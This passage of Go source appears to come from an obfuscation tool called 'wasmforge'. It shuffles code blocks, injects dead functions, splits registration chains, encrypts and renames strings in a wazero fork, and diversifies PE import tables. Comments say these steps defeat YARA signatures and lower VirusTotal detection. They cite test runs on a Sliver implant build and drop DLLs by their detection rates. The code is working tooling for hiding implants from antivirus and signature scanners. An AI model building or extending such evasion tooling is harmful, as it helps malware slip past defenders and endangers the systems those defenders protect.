			if trimmed == "" || strings.HasPrefix(trimmed, "//") {
				pendingComments = append(pendingComments, line)
			} else {
				// Non-comment, non-declaration line in header.
				header = append(header, pendingComments...)
				pendingComments = nil
				header = append(header, line)
			}
			continue
		}

		// Check if this is a new top-level declaration.
		if isTopLevelDecl(line) {
			// Flush previous block, but move trailing comments/directives
			// from the previous block to the new block.
			// Split: pending comment lines at the END of currentBlock
			// that are //go: directives or // comments belong to the NEW block.
			var moveToNew []string
			for len(currentBlock) > 0 {
				last := currentBlock[len(currentBlock)-1]
				lastTrimmed := strings.TrimSpace(last)
				if lastTrimmed == "" || strings.HasPrefix(lastTrimmed, "//") {
					moveToNew = append([]string{last}, moveToNew...)
					currentBlock = currentBlock[:len(currentBlock)-1]
				} else {
					break
				}
			}
			flushBlock()
			currentBlock = append(currentBlock, moveToNew...)
			currentBlock = append(currentBlock, line)
			continue
		}

		currentBlock = append(currentBlock, line)
	}
	flushBlock()

	if len(blocks) <= 1 {
		return nil
	}

	// Separate init blocks (preserve order) from non-init blocks (shuffle).
	var initBlocks, nonInitBlocks []block
	for _, b := range blocks {
		if b.isInit {
			initBlocks = append(initBlocks, b)
		} else {
			nonInitBlocks = append(nonInitBlocks, b)
		}
	}

	// Fisher-Yates shuffle of non-init blocks.
	for i := len(nonInitBlocks) - 1; i > 0; i-- {
		j := cryptoRandN(i + 1)
		nonInitBlocks[i], nonInitBlocks[j] = nonInitBlocks[j], nonInitBlocks[i]
	}

	// Reassemble: header, then init blocks, then shuffled non-init blocks.
	var out []string
	out = append(out, header...)
	for _, b := range initBlocks {
		out = append(out, b.lines...)
	}
	for _, b := range nonInitBlocks {
		out = append(out, b.lines...)
	}

	return os.WriteFile(path, []byte(strings.Join(out, "\n")), 0o644)
}

func blockLineCount(blocks []block) int {
	n := 0
	for _, b := range blocks {
		n += len(b.lines)
	}
	return n
}

// ---------------------------------------------------------------------------
// Phase 6: Dead Code Injection
// ---------------------------------------------------------------------------

// Dead code templates — generate functions that look like real utility code.
var deadCodeTemplates = []string{
	`func %s(data []byte, offset int) int {
	sum := 0
	for i := 0; i < len(data); i++ {
		sum += int(data[i]) ^ (offset + i)
	}
	return sum
}`,
	`func %s(src, dst []byte) int {
	n := len(src)
	if n > len(dst) { n = len(dst) }
	for i := 0; i < n; i++ {
		dst[i] = src[i] ^ byte(i)
	}
	return n
}`,
	`func %s(key string, table map[string]int) int {
	if v, ok := table[key]; ok {
		return v
	}
	h := 0
	for _, c := range key {
		h = h*31 + int(c)
	}
	return h
}`,
	`func %s(items []string) []string {
	seen := make(map[string]bool, len(items))
	out := make([]string, 0, len(items))
	for _, s := range items {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}`,
	`func %s(a, b []byte) bool {
	if len(a) != len(b) { return false }
	result := byte(0)
	for i := range a {
		result |= a[i] ^ b[i]
	}
	return result == 0
}`,
	`func %s(n int) []int {
	result := make([]int, n)
	for i := range result {
		result[i] = i * i
	}
	return result
}`,
	`func %s(s string, width int) string {
	if len(s) >= width { return s }
	pad := make([]byte, width-len(s))
	for i := range pad { pad[i] = ' ' }
	return string(pad) + s
}`,
	`func %s(input []byte, blockSize int) [][]byte {
	var chunks [][]byte
	for i := 0; i < len(input); i += blockSize {
		end := i + blockSize
		if end > len(input) { end = len(input) }
		chunks = append(chunks, input[i:end])
	}
	return chunks
}`,
}

func (tc *hostTransformConfig) injectDeadCodeInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	if len(files) == 0 {
		return nil
	}

	// Determine package name.
	pkgName := ""
	for _, f := range files {
		data, _ := os.ReadFile(f)
		if m := regexp.MustCompile(`^package\s+(\w+)`).FindSubmatch(data); m != nil {
			pkgName = string(m[1])
			break
		}
	}
	if pkgName == "" {
		return nil
	}

	// Pre-populate tc.used with every top-level identifier already declared in
	// this directory so that newly generated names never collide with existing
	// declarations. This is necessary because the ghost DeadCodePackages()
	// generator uses its own fnUsed map, so names it chose are not yet in tc.used.
	funcRe := regexp.MustCompile(`(?m)^func\s+(\w+)\s*[\(\(]`)
	varRe := regexp.MustCompile(`(?m)^var\s+(\w+)\b`)
	typeRe := regexp.MustCompile(`(?m)^type\s+(\w+)\b`)
	// Match import aliases: explicit `alias "path"` and implicit `"path"` (alias = last segment).
	// Prevents dead code function names from shadowing import aliases in the same package.
	// Example: HostmodPkg="html" → runtime file imports "traefik/lib/html" with alias "html";
	// a dead code function also named "html" would cause "html redeclared in this block".
	importExplicitRe := regexp.MustCompile(`(?m)^\s+(\w+)\s+"[^"]+"\s*$`)
	// Capture last path segment of implicit imports (works for single and multi-segment paths).
	// Matches lines with ONLY a quoted string (no preceding word or underscore alias).
	// "context" → context; "net/http" → http; "traefik/lib/html" → html.
	importImplicitRe := regexp.MustCompile(`(?m)^\s+"(?:[^"]+/)?(\w+)"\s*$`)
	for _, f := range files {
		data, _ := os.ReadFile(f)
		for _, m := range funcRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
		for _, m := range varRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
		for _, m := range typeRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
		for _, m := range importExplicitRe.FindAllSubmatch(data, -1) {
			alias := string(m[1])
			if alias != "_" && alias != "." {
				tc.used[alias] = true
			}
		}
		for _, m := range importImplicitRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
	}

	// Generate 3-8 dead code functions per package.
	count := 3 + cryptoRandN(6)
	if count > len(deadCodeTemplates) {
		count = len(deadCodeTemplates)
	}

	// Shuffle templates and pick first N.
	indices := make([]int, len(deadCodeTemplates))
	for i := range indices {
		indices[i] = i
	}
	for i := len(indices) - 1; i > 0; i-- {
		j := cryptoRandN(i + 1)
		indices[i], indices[j] = indices[j], indices[i]
	}

	var b strings.Builder
	b.WriteString(fmt.Sprintf("package %s\n\n", pkgName))

	// Always-false flag variable (prevents dead code elimination).
	flagName := tc.ghostOrGenerate()
	b.WriteString(fmt.Sprintf("var %s bool\n\n", flagName))

	var funcNames []string
	for i := 0; i < count; i++ {
		name := tc.ghostOrGenerate()
		funcNames = append(funcNames, name)
		tmpl := deadCodeTemplates[indices[i]]
		b.WriteString(fmt.Sprintf(tmpl, name))
		b.WriteString("\n\n")
	}

	// Write the dead code file.
	// Ensure the filename doesn't start with '_' or '.' — Go ignores such files.
	deadFileName := tc.ghostOrGenerate()
	for strings.HasPrefix(deadFileName, "_") || strings.HasPrefix(deadFileName, ".") {
		deadFileName = "z" + deadFileName[1:]
	}
	deadFile := filepath.Join(dir, deadFileName+".go")
	if err := os.WriteFile(deadFile, []byte(b.String()), 0o644); err != nil {
		return err
	}

	// Inject references from a real file to prevent linker elimination.
	// Pick a random .go file (not generated/init files) and add a guarded call.
	var eligibleFiles []string
	for _, f := range files {
		base := filepath.Base(f)
		if !strings.HasPrefix(base, "zz_") && !strings.HasPrefix(base, "generated_") {
			eligibleFiles = append(eligibleFiles, f)
		}
	}
	if len(eligibleFiles) > 0 && len(funcNames) > 0 {
		targetFile := eligibleFiles[cryptoRandN(len(eligibleFiles))]
		data, err := os.ReadFile(targetFile)
		if err != nil {
			return nil // non-fatal
		}
		content := string(data)

		// Find a function body to inject into (look for a closing brace at column 0).
		injection := fmt.Sprintf("\tif %s { _ = %s ", flagName, funcNames[0])
		// Build a dummy call that references all dead functions.
		for i := 1; i < len(funcNames); i++ {
			injection += fmt.Sprintf("; _ = %s ", funcNames[i])
		}
		injection += "}\n"

		// Inject as a package-level init function instead of modifying
		// existing functions (avoids breaking return statements).
		initName := tc.ghostOrGenerate()
		initFunc := fmt.Sprintf("\nfunc %s() {\n%s}\n", initName, injection)
		// Also add an init() call.
		initCall := fmt.Sprintf("\nfunc init() { %s() }\n", initName)
		content = content + initFunc + initCall
		os.WriteFile(targetFile, []byte(content), 0o644)
	}

	return nil
}

// ---------------------------------------------------------------------------
// Phase 8: Registration Chain Splitting
// ---------------------------------------------------------------------------

// splitRegistrationChainsInDir finds Go files with long builder chains
// (8+ Export() calls in a single method chain) and splits them into
// randomly-sized sub-functions. This breaks the distinctive structural
// pattern of 45+ sequential .WithGoModuleFunction().Export() chains
// that YARA rules can detect as a control flow signature.
func (tc *hostTransformConfig) splitRegistrationChainsInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))

	// Pre-populate tc.used with every top-level identifier already declared in
	// this directory so that ghost-generated sub-function names don't collide
	// with existing types/funcs/vars (e.g., "Config" function vs "Config" type).
	preScanFuncRe := regexp.MustCompile(`(?m)^func\s+(\w+)\s*[\(\(]`)
	preScanVarRe := regexp.MustCompile(`(?m)^var\s+(\w+)\b`)
	preScanTypeRe := regexp.MustCompile(`(?m)^type\s+(\w+)\b`)
	for _, f := range files {
		data, _ := os.ReadFile(f)
		for _, m := range preScanFuncRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
		for _, m := range preScanVarRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
		for _, m := range preScanTypeRe.FindAllSubmatch(data, -1) {
			tc.used[string(m[1])] = true
		}
	}

	for _, f := range files {
		base := filepath.Base(f)
		if strings.HasPrefix(base, "zz_") || strings.HasPrefix(base, "generated_") {
			continue
		}
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		content := string(data)
		if strings.Count(content, "Export(") < 8 {
			continue
		}
		modified := tc.splitRegistrationChains(content)
		if modified != content {
			if err := os.WriteFile(f, []byte(modified), 0o644); err != nil {
				return fmt.Errorf("writing %s: %w", f, err)
			}
		}
	}
	return nil
}

// registrationBlock is one NewFunctionBuilder()...Export() chain.
type registrationBlock struct {
	lines []string
}

// splitRegistrationChains finds functions with the pattern:
//
//	func NAME(b TYPE.HostModuleBuilder) TYPE.HostModuleBuilder {
//	    return b.
//	        NewFunctionBuilder()...Export(...).
//	        NewFunctionBuilder()...Export(...)
//	}
//
// and splits them into randomly-grouped sub-functions.
func (tc *hostTransformConfig) splitRegistrationChains(content string) string {
	lines := strings.Split(content, "\n")
	var result []string
	var appendFuncs []string
	i := 0

	for i < len(lines) {
		line := lines[i]

		// Look for registration function signature:
		// func NAME(b SOMETHING.HostModuleBuilder) SOMETHING.HostModuleBuilder {
		if !strings.Contains(line, "HostModuleBuilder") || !strings.HasPrefix(line, "func ") || !strings.HasSuffix(strings.TrimSpace(line), "{") {
			result = append(result, line)
			i++
			continue
		}

		// Check next line for "return VARNAME."
		if i+1 >= len(lines) {
			result = append(result, line)
			i++
			continue
		}
		returnLine := strings.TrimSpace(lines[i+1])
		if !strings.HasPrefix(returnLine, "return ") || !strings.HasSuffix(returnLine, ".") {
			result = append(result, line)
			i++
			continue
		}

		// Extract the builder variable name and type.
		paramVar := ""
		paramType := ""
		// Parse: func NAME(VARNAME PKGNAME.HostModuleBuilder) PKGNAME.HostModuleBuilder {
		sigContent := line[len("func "):]
		parenOpen := strings.Index(sigContent, "(")
		parenClose := strings.Index(sigContent, ")")
		if parenOpen < 0 || parenClose < 0 {
			result = append(result, line)
			i++
			continue
		}
		paramPart := sigContent[parenOpen+1 : parenClose]
		parts := strings.Fields(paramPart)
		if len(parts) != 2 || !strings.HasSuffix(parts[1], ".HostModuleBuilder") {
			result = append(result, line)
			i++
			continue
		}
		paramVar = parts[0]
		paramType = parts[1]

		// Collect the entire function body (track brace depth).
		funcStartLine := i
		braceDepth := 1 // opened by the { on the signature line
		bodyStart := i + 2 // skip signature and "return b." lines
		i = bodyStart
		funcEndLine := -1
		for i < len(lines) {
			for _, ch := range lines[i] {
				if ch == '{' {
					braceDepth++
				} else if ch == '}' {
					braceDepth--
					if braceDepth == 0 {
						funcEndLine = i
						break
					}
				}
			}
			if funcEndLine >= 0 {
				break
			}
			i++
		}
		if funcEndLine < 0 {
			// Malformed — skip.
			result = append(result, lines[funcStartLine:]...)
			break
		}

		// Extract the chain body lines (between "return b." and closing "}")
		chainLines := lines[bodyStart:funcEndLine]

		// Split chain into registration blocks. Each block starts at a
		// line containing "NewFunctionBuilder()" or a comment preceding it.
		blocks := splitIntoBlocks(chainLines)

		if len(blocks) < 8 {
			// Not enough blocks to split — keep original.
			for j := funcStartLine; j <= funcEndLine; j++ {
				result = append(result, lines[j])
			}
			i = funcEndLine + 1
			continue
		}

		// Group blocks into 4-10 randomly-sized groups.
		groups := tc.randomGroupBlocks(blocks)

		// Generate sub-functions and rewrite the parent function.
		funcName := sigContent[:parenOpen]
		funcName = strings.TrimSpace(funcName)
		var subFuncNames []string
		for _, group := range groups {
			subName := tc.ghostOrGenerate()
			subFuncNames = append(subFuncNames, subName)
			subFunc := tc.emitSubFunction(subName, paramVar, paramType, group)
			appendFuncs = append(appendFuncs, subFunc)
		}

		// Shuffle sub-function call order.
		shuffled := make([]string, len(subFuncNames))
		copy(shuffled, subFuncNames)
		for j := len(shuffled) - 1; j > 0; j-- {
			k := cryptoRandN(j + 1)
			shuffled[j], shuffled[k] = shuffled[k], shuffled[j]
		}

		// Emit rewritten parent function.
		result = append(result, fmt.Sprintf("func %s(%s %s) %s {", funcName, paramVar, paramType, paramType))
		for _, name := range shuffled {
			result = append(result, fmt.Sprintf("\t%s = %s(%s)", paramVar, name, paramVar))
		}
		result = append(result, fmt.Sprintf("\treturn %s", paramVar))
		result = append(result, "}")

		i = funcEndLine + 1
	}

	if len(appendFuncs) == 0 {
		return content // no changes
	}

	result = append(result, appendFuncs...)
	return strings.Join(result, "\n")
}

// splitIntoBlocks splits registration chain lines into individual blocks.
// Each block runs from a NewFunctionBuilder() line through the corresponding
// Export() line, including any preceding comment/blank lines.
func splitIntoBlocks(chainLines []string) []registrationBlock {
	// Find indices of all NewFunctionBuilder() lines.
	var nfIndices []int
	for i, line := range chainLines {
		if strings.Contains(strings.TrimSpace(line), "NewFunctionBuilder()") {
			nfIndices = append(nfIndices, i)
		}
	}
	if len(nfIndices) == 0 {
		return nil
	}

	var blocks []registrationBlock
	for i, nfIdx := range nfIndices {
		// Block extends from this NF() to just before the next NF(),
		// but we include preceding blank/comment lines (preamble).
		start := nfIdx
		// Look backward to include preceding comments/blanks.
		for start > 0 {
			prev := strings.TrimSpace(chainLines[start-1])
			if prev == "" || strings.HasPrefix(prev, "//") {
				start--
			} else {
				break
			}
		}
		// Don't overlap with the previous block's content. The boundary
		// between blocks is this NF() index — comments before it may have
		// been claimed by the backward scan, but they could also belong
		// to the previous block's trailing region.
		if i > 0 {
			boundary := nfIndices[i] // this block's NF() line index
			if start < boundary {
				// Find where previous block's content ends (last non-blank, non-comment line).
				for k := boundary - 1; k >= nfIndices[i-1]; k-- {
					t := strings.TrimSpace(chainLines[k])
					if t != "" && !strings.HasPrefix(t, "//") {
						start = k + 1
						break
					}
				}
			}
		}

		// Block end: just before next NF()'s preamble, or end of chain.
		end := len(chainLines)
		if i+1 < len(nfIndices) {
			end = nfIndices[i+1]
			// Include trailing blank/comment lines that belong to the next block
			// by stopping at the last content line.
			for end > nfIdx && end > 0 {
				prev := strings.TrimSpace(chainLines[end-1])
				if prev == "" || strings.HasPrefix(prev, "//") {
					end--
				} else {
					break
				}
			}
		}

		if start < end {
			blocks = append(blocks, registrationBlock{lines: chainLines[start:end]})
		}
	}

	return blocks
}

// randomGroupBlocks splits blocks into 4-10 randomly-sized groups.
func (tc *hostTransformConfig) randomGroupBlocks(blocks []registrationBlock) [][]registrationBlock {
	n := len(blocks)
	if n <= 1 {
		return [][]registrationBlock{blocks}
	}
	groupCount := 4 + cryptoRandN(7) // 4-10 groups
	if groupCount > n {
		groupCount = n
	}

	// Generate random split points.
	splitPoints := make(map[int]bool)
	splitPoints[0] = true
	for len(splitPoints) < groupCount {
		splitPoints[1+cryptoRandN(n-1)] = true
	}

	// Sort split points.
	sorted := make([]int, 0, len(splitPoints))
	for p := range splitPoints {
		sorted = append(sorted, p)
	}
	sort.Ints(sorted)

	// Create groups.
	var groups [][]registrationBlock
	for i, start := range sorted {
		end := n
		if i+1 < len(sorted) {
			end = sorted[i+1]
		}
		groups = append(groups, blocks[start:end])
	}

	return groups
}

// emitSubFunction generates a sub-function that registers a group of blocks.
// The function takes a builder, adds registrations via method chain, and returns it.
func (tc *hostTransformConfig) emitSubFunction(name, paramVar, paramType string, blocks []registrationBlock) string {
	// Flatten all block lines.
	var allLines []string
	for _, block := range blocks {
		allLines = append(allLines, block.lines...)
	}

	// Find the last non-empty line — if it ends with ")." remove the dot
	// (it's the end of this sub-function's chain, not a continuation).
	lastNonEmpty := -1
	for i := len(allLines) - 1; i >= 0; i-- {
		if strings.TrimSpace(allLines[i]) != "" {
			lastNonEmpty = i
			break
		}
	}
	if lastNonEmpty >= 0 {
		s := strings.TrimRight(allLines[lastNonEmpty], " \t")
		if strings.HasSuffix(s, ").") {
			allLines[lastNonEmpty] = s[:len(s)-1]
		}
	}

	var b strings.Builder
	b.WriteString(fmt.Sprintf("\nfunc %s(%s %s) %s {\n", name, paramVar, paramType, paramType))
	b.WriteString(fmt.Sprintf("\treturn %s.\n", paramVar))
	for _, line := range allLines {
		b.WriteString(line)
		b.WriteString("\n")
	}
	b.WriteString("}\n")
	return b.String()
}

// ---------------------------------------------------------------------------
// Phase 3: Wazero String Obfuscation
// ---------------------------------------------------------------------------

// rewriteWazeroModulePath rewrites the wazero fork's module path, internal
// import references, and distinctive type names. This removes "wazero" from
// gopclntab and kills YARA-detectable method signatures like
// "(*hostFunctionBuilder).WithGoModuleFunction".
func rewriteWazeroModulePath(wazeroDir, oldPath, newPath string, typeRenames []stringPair) error {
	// Rewrite go.mod.
	gomodPath := filepath.Join(wazeroDir, "go.mod")
	data, err := os.ReadFile(gomodPath)
	if err != nil {
		return fmt.Errorf("reading wazero go.mod: %w", err)
	}
	content := strings.ReplaceAll(string(data), oldPath, newPath)
	if err := os.WriteFile(gomodPath, []byte(content), 0o644); err != nil {
		return fmt.Errorf("writing wazero go.mod: %w", err)
	}

	// Extract the runtime type rename (special handling for "runtime" conflicts).
	runtimeNewName := ""
	for _, r := range typeRenames {
		if r.old == "%%WAZERO_RUNTIME_TYPE%%" {
			runtimeNewName = r.new
			break
		}
	}

	// Rewrite all .go files — replace import paths, package name, and type names.
	// The top-level package is "wazero" — rename to the last segment
	// of the new path (e.g., "core") to remove from type names in gopclntab.
	newPkgName := filepath.Base(newPath)
	err = filepath.Walk(wazeroDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(path, ".go") {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		content := string(data)
		changed := false

		if strings.Contains(content, oldPath) {
			content = strings.ReplaceAll(content, oldPath, newPath)
			changed = true
		}

		// Rename package wazero → newPkgName (only for the top-level package).
		// Check if this file is in the wazero root (not a subdirectory).
		rel, _ := filepath.Rel(wazeroDir, path)
		if !strings.Contains(rel, string(filepath.Separator)) {
			// Top-level file — rename package declaration.
			if strings.Contains(content, "package wazero") {
				content = strings.ReplaceAll(content, "package wazero", "package "+newPkgName)
				changed = true
			}
		}
		// Also rename "wazero." references in sub-packages that import
		// the top-level package (e.g., wazero.RuntimeConfig).
		if strings.Contains(content, "wazero.") {
			content = strings.ReplaceAll(content, "wazero.", newPkgName+".")
			changed = true
		}
		if strings.Contains(content, `wazero "`) {
			content = strings.ReplaceAll(content, `wazero "`, newPkgName+` "`)
			changed = true
		}

		// Apply type name renames (kills YARA-detectable gopclntab signatures).
		for _, r := range typeRenames {
			if r.old == "%%WAZERO_RUNTIME_TYPE%%" {
				continue // handled separately below
			}
			old := r.old
			// %%SHORT%% prefix marks entries needing context-aware replacement
			// to avoid corrupting words containing the substring (e.g., "message" has "ssa").
			if strings.HasPrefix(old, "%%PROTECT_STR%%") {
				// Replace in import paths, package declarations, and identifiers
				// but NOT inside quoted string literals (the runtime needs the
				// original value for WASM module registration).
				old = strings.TrimPrefix(old, "%%PROTECT_STR%%")
				newContent := content
				// 1. Import paths: /wasi_snapshot_preview1/ and /wasi_snapshot_preview1"
				newContent = strings.ReplaceAll(newContent, "/"+old+"/", "/"+r.new+"/")
				newContent = strings.ReplaceAll(newContent, "/"+old+`"`, "/"+r.new+`"`)
				newContent = strings.ReplaceAll(newContent, "/"+old+"\n", "/"+r.new+"\n")
				// 2. Package declaration
				newContent = strings.ReplaceAll(newContent, "package "+old, "package "+r.new)
				// 3. Package qualifier (e.g., wasi_snapshot_preview1.MustInstantiate)
				newContent = strings.ReplaceAll(newContent, old+".", r.new+".")
				// 4. Import alias
				newContent = strings.ReplaceAll(newContent, old+` "`, r.new+` "`)
				if newContent != content {
					content = newContent
					changed = true
				}
				continue
			}
			if strings.HasPrefix(old, "%%FORK_ONLY%%") {
				// Targeted identifier replacement inside wazero fork only.
				// These are specific identifiers (7+ chars) safe for ReplaceAll.
				// EXCEPTION: do NOT replace inside import path strings. Import paths
				// appear as /identifier/ or /identifier" in quoted strings. If the
				// identifier matches a directory name (e.g., wve="compiler" and this
				// entry is "compiler"→"translator"), replacing inside the path would
				// make source code reference engine/translator but the directory is
				// still engine/compiler → "not in std" errors.
				old = strings.TrimPrefix(old, "%%FORK_ONLY%%")
				if strings.Contains(content, old) {
					// Protect import path contexts by temporarily replacing /old/ and
					// /old" with unique tokens that survive the ReplaceAll unchanged.
					// Also protect "old/ (module-root import: "compiler/core/api") because
					// the module path starts at the opening quote, not a slash.
					const sep1 = "\x00P1\x00"
					const sep2 = "\x00P2\x00"
					const sep3 = "\x00P3\x00"
					protected := strings.ReplaceAll(content, "/"+old+"/", "/"+sep1+old+sep1+"/")
					protected = strings.ReplaceAll(protected, "/"+old+`"`, "/"+sep2+old+sep2+`"`)
					protected = strings.ReplaceAll(protected, `"`+old+"/", `"`+sep3+old+sep3+"/")
					// Apply the identifier rename.
					replaced := strings.ReplaceAll(protected, old, r.new)
					// Restore protected import path segments (keep original name).
					replaced = strings.ReplaceAll(replaced, "/"+sep1+r.new+sep1+"/", "/"+old+"/")
					replaced = strings.ReplaceAll(replaced, "/"+sep2+r.new+sep2+`"`, "/"+old+`"`)
					replaced = strings.ReplaceAll(replaced, `"`+sep3+r.new+sep3+"/", `"`+old+"/")
					if replaced != content {
						content = replaced
						changed = true
					}
				}
				continue
			}
			if strings.HasPrefix(old, "%%SHORT%%") {
				old = strings.TrimPrefix(old, "%%SHORT%%")
				// Context-aware replacement for short strings (wasm, ssa).
				// Replace as: import path component, package qualifier, declaration.
				newContent := content
				// 1. Path component: /wasm/ or /wasm" or /wasm\n
				newContent = strings.ReplaceAll(newContent, "/"+old+"/", "/"+r.new+"/")
				newContent = strings.ReplaceAll(newContent, "/"+old+`"`, "/"+r.new+`"`)
				newContent = strings.ReplaceAll(newContent, "/"+old+"\n", "/"+r.new+"\n")
				// 2. Package qualifier: wasm. (e.g., wasm.Module)
				newContent = strings.ReplaceAll(newContent, old+".", r.new+".")
				// 3. Package declaration: package wasm
				newContent = strings.ReplaceAll(newContent, "package "+old, "package "+r.new)
				// 4. Import alias: wasm "path"
				newContent = strings.ReplaceAll(newContent, old+` "`, r.new+` "`)
				if newContent != content {
					content = newContent
					changed = true
				}
				continue
			}
			if strings.Contains(content, old) {
				content = strings.ReplaceAll(content, old, r.new)
				changed = true
			}
		}

		// Special handling for "runtime" type — can't do global replace because
		// Go's "runtime" package is referenced throughout. Only rename in
		// top-level wazero package files where the struct is defined and used.
		// Match `runtime` as a TYPE name (preceded by *, &, or "type ") but
		// NOT as a package qualifier (followed by ".") or import ("runtime").
		// Uses \b on the right side to avoid matching runtimeConfig etc.
		if runtimeNewName != "" && !strings.Contains(rel, string(filepath.Separator)) {
			// Matches: *runtime, &runtime{, (r *runtime), type runtime struct
			// Does NOT match: runtime.X, "runtime", runtimeConfig
			runtimeTypeRe := regexp.MustCompile(`([*&]\s*)runtime\b`)
			newContent := runtimeTypeRe.ReplaceAllString(content, "${1}"+runtimeNewName)
			// Also handle: "type runtime struct"
			newContent = strings.ReplaceAll(newContent, "type runtime struct", "type "+runtimeNewName+" struct")
			if newContent != content {
				content = newContent
				changed = true
			}
		}

		if changed {
			return os.WriteFile(path, []byte(content), 0o644)
		}
		return nil
	})
	if err != nil {
		return err
	}

	// Rename directories whose basename matches a typeRenames entry.
	// This covers wazero sub-packages (wasm, ssa, wasip1, wazevo, etc.).
	type dirRename struct {
		oldBase string
		newBase string
	}
	var wazevoDirRenames []dirRename
	for _, r := range typeRenames {
		old := r.old
		if r.old == "%%WAZERO_RUNTIME_TYPE%%" {
			continue
		}
		// %%FORK_ONLY%% entries are identifier renames, not directory names.
		if strings.HasPrefix(old, "%%FORK_ONLY%%") {
			continue
		}
		// Strip marker prefixes for directory matching.
		old = strings.TrimPrefix(old, "%%SHORT%%")
		old = strings.TrimPrefix(old, "%%PROTECT_STR%%")
		// Skip entries that are error messages, string literals, or method names
		// (they contain spaces, quotes, dots, or commas — not valid directory names).
		if strings.ContainsAny(old, " \".',") {
			continue
		}
		wazevoDirRenames = append(wazevoDirRenames, dirRename{old, r.new})
	}
	// Sort deepest-first (wazevoapi before wazevo).
	sort.Slice(wazevoDirRenames, func(i, j int) bool {
		return len(wazevoDirRenames[i].oldBase) > len(wazevoDirRenames[j].oldBase)
	})
	for _, dr := range wazevoDirRenames {
		_ = filepath.Walk(wazeroDir, func(path string, info os.FileInfo, walkErr error) error {
			if walkErr != nil || !info.IsDir() {
				return nil
			}
			if filepath.Base(path) == dr.oldBase {
				newPath := filepath.Join(filepath.Dir(path), dr.newBase)
				if renameErr := os.Rename(path, newPath); renameErr == nil {
					return filepath.SkipDir // renamed, skip children (they moved)
				}
			}
			return nil
		})
	}

	// Rename .go source files that contain distinctive substrings.
	// These filenames appear in gopclntab (e.g., "wasm.go", "leb128.go").
	// Uses the same rename list but applied to file basenames.
	wl := newWordList()
	fileUsed := make(map[string]bool)
	_ = filepath.Walk(wazeroDir, func(path string, info os.FileInfo, walkErr error) error {
		if walkErr != nil || info.IsDir() || !strings.HasSuffix(path, ".go") {
			return nil
		}
		base := strings.TrimSuffix(filepath.Base(path), ".go")
		needsRename := false
		for _, dr := range wazevoDirRenames {
			if strings.Contains(base, dr.oldBase) {
				needsRename = true
				break
			}
		}
		// Also rename files containing forbidden substrings not in the dir list.
		for _, extra := range []string{"wasi", "compiler", "opcode"} {
			if strings.Contains(base, extra) {
				needsRename = true
				break
			}
		}
		if needsRename {
			newBase := wl.generate(fileUsed) + ".go"
			newPath := filepath.Join(filepath.Dir(path), newBase)
			os.Rename(path, newPath)
			return nil
		}
		return nil
	})

	return nil
}

// transformWazeroStrings encrypts distinctive strings in the copied wazero fork.
// Uses the same inline-decrypt approach as Phase 1 but applied to wazero packages.
// Only processes packages likely to contain YARA-matchable strings.
func transformWazeroStrings(wazeroDir string, verbose bool) error {
	tc := &hostTransformConfig{
		wl:   newWordList(),
		used: make(map[string]bool),
	}
	if _, err := rand.Read(tc.strKey[:]); err != nil {
		return err
	}
	tc.decryptFuncName = tc.wl.generate(tc.used)
	tc.strKeyName = tc.wl.generate(tc.used)

	// Walk wazero directory, find packages with .go files.
	var pkgDirs []string
	filepath.Walk(wazeroDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || !info.IsDir() {
			return nil
		}
		// Skip directories unlikely to have YARA-matchable strings.
		base := filepath.Base(path)
		if base == "testdata" || base == ".git" || base == "vendor" || base == "site" {
			return filepath.SkipDir
		}
		files, _ := filepath.Glob(filepath.Join(path, "*.go"))
		if len(files) > 0 {
			pkgDirs = append(pkgDirs, path)
		}
		return nil
	})

	encrypted := 0
	for _, dir := range pkgDirs {
		if err := tc.encryptStringsInDir(dir); err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: wazero encrypt %s: %v\n", dir, err)
			}
			continue
		}
		encrypted++
	}

	if verbose && encrypted > 0 {
		fmt.Fprintf(os.Stderr, "wasmforge: encrypted strings in %d wazero packages\n", encrypted)
	}
	return nil
}

// ---------------------------------------------------------------------------
// Phase 4: PE Import Diversification
// ---------------------------------------------------------------------------

// ImportDiversityPool provides a pool of DLLs and functions for PE import
// table diversification. Each build randomly selects a subset.
type importDiversityEntry struct {
	DLL   string
	Funcs []string
}

// importDiversityPool — VT testing (n=25, 2026-03-18, n=20 2026-03-24) pruned entries:
//   Removed: netapi32.dll (0% clean in detected, 27% in detected samples),
//            ole32.dll (0% clean in detected, 33% in detected samples),
//            winhttp.dll (0% clean in detected, 27% in detected samples).
//   Remaining 9 entries all showed higher presence in clean samples than detected.
// VT testing (2026-04-07):
//   Removed: wtsapi32.dll (0/5 clean, 5/15 detected).
// VT testing (2026-04-08, Sliver 15MB, n=20):
//   Removed: user32.dll (0/3 clean, 53% detected), ws2_32.dll (0/3 clean, 41% detected).
// importDiversityPool — VT testing (2026-04-08, Sliver 15MB, n=20) correlation analysis:
//   shell32.dll: 0/3 clean, 7/10 both-detected (64%) → REMOVED
//   advapi32.dll: 3/11 clean (27%), protective in combination with crypt32 → KEEP
//   crypt32.dll: 2/8 clean (25%), pair (crypt32,secur32) appears ONLY in clean → KEEP
//   secur32.dll: 2/13 clean (15%) → KEEP
//   iphlpapi.dll: 1/9 clean (11%) → KEEP
//   version.dll: 1/9 clean (11%) → KEEP
var importDiversityPool = []importDiversityEntry{
	// VT testing (2026-05-14, traefik profile, n=30): crypt32+iphlpapi+version
	// had 83% MS detection rate. version.dll removed.
	// Also: VERSIONINFO (.rsrc) is now stripped by default, so version.dll
	// functions (GetFileVersionInfoW etc.) are doubly suspicious without it.
	{"advapi32.dll", []string{"RegOpenKeyExW", "RegCloseKey", "GetUserNameW", "OpenProcessToken", "LookupPrivilegeValueW", "RegQueryValueExW"}},
